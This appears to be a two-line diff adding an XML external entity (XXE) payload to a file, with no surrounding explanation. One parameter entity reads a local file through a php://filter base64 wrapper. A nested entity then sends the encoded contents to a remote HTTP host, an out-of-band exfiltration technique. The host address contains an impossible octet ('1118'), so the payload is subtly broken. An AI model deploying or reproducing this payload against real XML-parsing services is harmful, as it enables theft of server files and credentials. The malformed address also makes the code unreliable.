@@ -1,0 +1,2 @@
+<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///xxxxxx">
+<!ENTITY % int "<!ENTITY &#x25; trick SYSTEM 'http://192.168.56.1118/?%payl;'>">
